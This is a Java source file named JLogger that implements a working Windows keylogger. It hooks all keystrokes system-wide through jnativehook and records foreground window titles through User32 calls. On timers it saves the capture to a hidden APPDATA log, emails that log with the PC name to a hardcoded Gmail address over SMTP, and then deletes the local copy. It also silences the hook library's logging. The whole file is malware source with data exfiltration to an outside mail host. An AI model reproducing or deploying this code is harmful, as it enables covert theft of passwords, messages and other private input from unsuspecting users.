package com.ovejera.jim.jlogger;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.Timer;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HWND;

public class JLogger implements NativeKeyListener{
	
	private static final int MAX_TITLE_LENGTH = 1024;
	private char[] newBuffer = new char[MAX_TITLE_LENGTH * 2];
	private String winTitle = "";
	private String keys = "";
	
	public static String NEW_LINE = System.getProperty("line.separator");
	private String PC_NAME = System.getenv().get("COMPUTERNAME");
	private static String APP_DATA = System.getenv("APPDATA") + "\\";
	private static String FILE_LOG_NAME = "jlog.txt";
	
	private static int FILE_SAVE_INTERVAL = 4000; // 900 000 - 15 mins
	private static int FILE_UPLOAD_INTERVAL = 8000; // 1 800 000 - 30 mins
	private static int WIN_TITLE_INTERVAL = 500;
	
	private PrintWriter writer;
	
	private Timer fileTimer = new Timer(FILE_SAVE_INTERVAL, new ActionListener(){
		public void actionPerformed(ActionEvent ae){

			try {
				writer = new PrintWriter(new BufferedWriter(new FileWriter(APP_DATA + FILE_LOG_NAME, true)));
				writer.write(keys);
				writer.close();
				keys = "";
				
//				LogFileReader.readLog(APP_DATA + FILE_LOG_NAME);
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	});
	
	private Timer winTitleTimer = new Timer(WIN_TITLE_INTERVAL, new ActionListener(){
		public void actionPerformed(ActionEvent ae){
			HWND hwnd = User32.INSTANCE.GetForegroundWindow();
			User32.INSTANCE.GetWindowText(hwnd, newBuffer, MAX_TITLE_LENGTH);
			
			String newStrBuffer = Native.toString(newBuffer);
			
			if(!winTitle.equals(newStrBuffer)){
				winTitle = newStrBuffer;
//				System.out.println(winTitle);
				keys += NEW_LINE + "==========";
				keys += winTitle;
				keys += "==========" + NEW_LINE;
			}
		}
	});
	
	private Properties mailServerProperties;
	private Session getMailSession;
	private MimeMessage generateMailMessage;
	
	private Timer emailTimer = new Timer(FILE_UPLOAD_INTERVAL, new ActionListener(){
		public void actionPerformed(ActionEvent ae){
			
//			mailServerProperties.put("mail.smtp.port", "587");
//			mailServerProperties.put("mail.smtp.auth", "true");
//			mailServerProperties.put("mail.smtp.starttls.enable", "true");
//			
//			getMailSession = Session.getDefaultInstance(mailServerProperties, null);
//			generateMailMessage = new MimeMessage(getMailSession);
			
			try {
				generateMailMessage.addRecipient(Message.RecipientType.TO, new InternetAddress("ovejera.jimpaulo@gmail.com"));
				generateMailMessage.setSubject("jLogger - Logs: " + PC_NAME);
				
				String log = "<clear>";
				try {
					log = LogFileReader.readLog(APP_DATA + FILE_LOG_NAME);
				} catch (IOException e) {
					e.printStackTrace();
				}
				generateMailMessage.setContent(log.replace(NEW_LINE, "<br/>"), "text/html");
				
				Transport transport = getMailSession.getTransport("smtp");
				transport.connect("smtp.gmail.com", "ovejera.jimpaulo@gmail.com", "xxx");
				transport.sendMessage(generateMailMessage, generateMailMessage.getAllRecipients());
				transport.close();
				
				LogFileReader.deleteLog(APP_DATA + FILE_LOG_NAME);
				
			} catch (AddressException e) {
				e.printStackTrace();
			} catch (MessagingException e) {
				e.printStackTrace();
			}
		}
	});
	
	public static void main(String args[]){
		new JLogger();
	}
	
	private void disableLogger(){
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		logger.setUseParentHandlers(false);
	}
	
	private void init(){
		winTitleTimer.start();
		fileTimer.start();
		
		mailServerProperties = new Properties();
		mailServerProperties.put("mail.smtp.port", "587");
		mailServerProperties.put("mail.smtp.auth", "true");
		mailServerProperties.put("mail.smtp.starttls.enable", "true");
		
		getMailSession = Session.getDefaultInstance(mailServerProperties, null);
		generateMailMessage = new MimeMessage(getMailSession);
		emailTimer.start();
	}
	
	public JLogger(){
		
		disableLogger();
		
		init();
		
		try{
			GlobalScreen.registerNativeHook();
		}catch(NativeHookException nke){
			nke.printStackTrace();
		}
		GlobalScreen.addNativeKeyListener(this);
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent nke) {
		if(nke.getKeyCode() == NativeKeyEvent.VC_ESCAPE){
			System.out.print("[ESC]");
			keys += "[ESC]";
		}else if(nke.getKeyCode() == NativeKeyEvent.VC_BACKSPACE){
			System.out.print("[BACK]");
			keys += "[BACK]";
		}else if(nke.getKeyCode() == NativeKeyEvent.VC_RIGHT){
			System.out.print("[>]");
			keys += "[>]";
		}else if(nke.getKeyCode() == NativeKeyEvent.VC_LEFT){
			System.out.print("[<]");
			keys += "[<]";
		}else if(nke.getKeyCode() == NativeKeyEvent.VC_UP){
			System.out.print("[^]");
			keys += "[^]";
		}else if(nke.getKeyCode() == NativeKeyEvent.VC_DOWN){
			System.out.print("[v]");
			keys += "[v]";
		}else if(nke.getKeyCode() == NativeKeyEvent.VC_ENTER){
			System.out.print("[ENTR]");
			keys += "[ENTR]";
			keys += NEW_LINE;
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent nke) {
		//System.out.println(nke.getRawCode());
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent nke) {
		if(nke.getRawCode() != 27 && nke.getRawCode() != 8 && nke.getRawCode() != 13){
			System.out.print(nke.getKeyChar());
			keys += nke.getKeyChar();
		}
	}

}
